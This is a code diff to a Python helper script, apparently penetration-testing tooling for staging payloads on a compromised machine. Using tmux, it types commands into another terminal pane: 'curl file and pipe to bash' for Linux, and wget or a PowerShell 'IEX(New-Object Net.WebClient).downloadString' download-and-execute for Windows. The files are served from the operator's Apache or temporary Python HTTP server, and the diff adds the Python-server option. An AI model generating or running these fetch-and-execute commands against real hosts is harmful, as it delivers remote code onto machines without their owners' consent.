@@ -74,7 +74,7 @@ def get_apache_file(pattern):
     print(files[index])
     return files[index]
 
-def get_temp_python_file():
+def get_temp_python_file(pattern):
     ip = get_interface_ip()
     cmd = "ps -ef | grep http.server | grep -v grep"
     output = os.popen(cmd).read()
@@ -82,12 +82,20 @@ def get_temp_python_file():
     print(items)
     port = items[-1]
     pid = items[1]
-    cmd = f"ls /proc/{pid}/cwd"
+    if pattern == '':
+        cmd = f"ls /proc/{pid}/cwd"
+    else:
+        cmd = f"ls /proc/{pid}/cwd | grep '{pattern}$'"
     files = strip_lines(os.popen(cmd).readlines())
     index = TerminalMenu(files).show()
     filename = files[index]
     url = f"http://{ip}:{port}/{filename}"
-    copy_to_pane(url)
+    return url
+
+def is_python_http_running():
+    cmd = "ps -ef | grep http.server | grep -v grep"
+    output = os.popen(cmd).read()
+    return len(output.strip('\n ')) > 0
 
 def linux_menu():
     options = ["Stabilize shell", "wget a file", "curl file and pipe to bash"]
@@ -105,19 +113,35 @@ def linux_menu():
             cmd = f"curl {ip}/{file} | bash"
         copy_to_pane(cmd)
 
+def choose_apache_or_python():
+    print("Get file from apache or temp python server?")
+    index = TerminalMenu(["Apache", "Python HTTP"]).show()
+    return index == 0
+
 def windows_menu():
+    useApache = True
+    if is_python_http_running():
+        useApache = choose_apache_or_python()
     options = ["wget outfile", "IEX download and run script"]
     index = TerminalMenu(options).show()
     if index == 0 or index == 1:
         ip = get_interface_ip()
         pane = select_pane()
         if index == 0:
-            file = get_apache_file('')
-            cmd = f"tmux send-keys -t {pane} 'wget {ip}/{file} -outfile {file}'"
+            if useApache:
+                file = get_apache_file('')
+                url = f"{ip}/{file}"
+            else:
+                url = get_temp_python_file('')
+                file = url.split('/')[-1]
+            cmd = f"tmux send-keys -t {pane} 'wget '{url}' -outfile {file}'"
         elif index == 1:
-            file = get_apache_file('.ps1')
-            # cmd = f"IEX(new-object net.webclient).downloadString(\'{ip}/{file}\'))"
-            cmd = f"tmux send-keys -t {pane} 'IEX(new-object net.webclient).downloadString(' \\' '{ip}/{file}' \\' '))'"
+            if useApache:
+                file = get_apache_file('.ps1')
+                url = f"http://{ip}/{file}"
+            else:
+                url = get_temp_python_file('.ps1')
+            cmd = f"tmux send-keys -t {pane} 'IEX(New-Object Net.WebClient).downloadString(' \\' '{url}' \\' ')'"
         os.system(cmd)
 
 def main():
@@ -132,7 +156,10 @@ def main():
     elif index == 2:
         windows_menu()
     elif index == 3:
-        get_temp_python_file()
+        if is_python_http_running():
+            copy_to_pane(get_temp_python_file(''))
+        else:
+            input("Start python http server and try again")
     elif index == 4:
         print("Starting apache... sudo required")
         os.system("sudo systemctl start apache2")
